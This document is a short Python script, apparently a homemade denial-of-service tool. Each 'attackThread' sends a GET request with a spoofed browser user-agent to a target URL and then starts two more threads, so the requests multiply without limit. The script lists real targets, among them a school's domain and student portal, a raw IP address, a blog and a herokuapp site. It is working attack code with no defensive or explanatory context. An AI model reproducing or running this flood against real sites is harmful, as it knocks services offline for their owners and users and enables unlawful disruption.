import requests

Headers = {
    "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 Edg/96.0.1054.53"
}

def postUrl(url):
    r = requests.post(url=url,headers=Headers)
    return r.text

def getUrl(url):
    r = requests.get(url=url,headers=Headers)
    return r.text

import threading

class attackThread(threading.Thread):
    def __init__(self,n):
        threading.Thread.__init__(self)
        self.n = n + 1
        self.start()

    def run(self):
        try:
            getUrl(TargetUrl)
            print(self.n)
        except Exception:
            print('error')
        attackThread(self.n)
        attackThread(self.n)


# TargetUrl = 'https://foonyew.edu.my'
# TargetUrl = 'http://175.137.177.164:3000/'
# TargetUrl = 'https://fystudent.foonyew.edu.my/'
# TargetUrl = 'https://www.thecodeblog.net/'
TargetUrl = 'https://stulang.herokuapp.com'

attackThread(0)
